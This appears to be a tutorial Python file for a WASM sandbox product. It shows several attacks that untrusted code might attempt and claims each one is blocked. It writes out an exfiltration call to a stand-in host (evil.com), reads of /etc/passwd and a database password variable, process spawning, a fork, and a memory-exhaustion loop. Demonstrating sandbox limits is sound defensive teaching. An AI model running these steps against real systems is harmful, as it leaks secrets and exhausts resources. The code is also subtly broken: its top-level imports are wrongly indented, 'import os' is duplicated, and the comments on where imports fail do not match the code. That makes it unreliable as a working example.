"""
# Sandbox: Security Validation

Examples of malicious code that fails in the sandbox.

## Metadata
- **Product**: Blazing Flow Sandbox
- **Difficulty**: Advanced
- **Time**: 20 min
- **Tags**: sandbox, security, validation, attacks

## Description

Examples of malicious code that fails in the sandbox.

## What you'll learn

- What code is blocked by WASM sandbox
- Security boundaries and guarantees
- Common attack patterns that fail
"""

from blazing import Blazing
        import httpx
        import subprocess
        import os
        import os

async def main():
    app = Blazing()  # Uses Blazing SaaS by default
    # USER CODE (untrusted - attempts malicious actions)
    @app.step
    async def malicious_attempts(services=None):
        """
        Malicious code examples - all FAIL in WASM sandbox.
        """
        # ❌ ATTEMPT 1: Network exfiltration
        try:
            # This import FAILS - httpx not available in WASM
            await httpx.get("http://evil.com/exfiltrate")
        except ImportError:
            pass  # httpx not available in sandbox
        # ❌ ATTEMPT 2: Read secrets from filesystem
        try:
            with open('/etc/passwd') as f:
                secrets = f.read()
        except (FileNotFoundError, OSError):
            pass  # No filesystem access in sandbox
        # ❌ ATTEMPT 3: Spawn process
        try:
            subprocess.run(['ls', '/'])
        except (ImportError, FileNotFoundError):
            pass  # subprocess not available in sandbox
        # ❌ ATTEMPT 4: Access environment variables
        try:
            api_key = os.getenv('DATABASE_PASSWORD')
        except Exception:
            pass  # No access to host environment
        # ❌ ATTEMPT 5: Fork bomb
        try:
            os.fork()
        except (ImportError, AttributeError):
            pass  # os.fork() not available in WASM
        # ❌ ATTEMPT 6: Memory exhaustion
        try:
            # WASM heap limited to 512MB - will crash sandbox, not host
            data = []
            while True:
                data.append("x" * 1024 * 1024)  # 1MB strings
        except MemoryError:
            pass  # WASM heap limit reached
        return {"message": "All attacks blocked by sandbox"}
    # YOUR CODE (trusted - orchestrates)
    @app.workflow
    async def test_security(services=None):
        """Test that malicious code is blocked."""
        return await malicious_attempts(services=services)
    await app.publish()


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
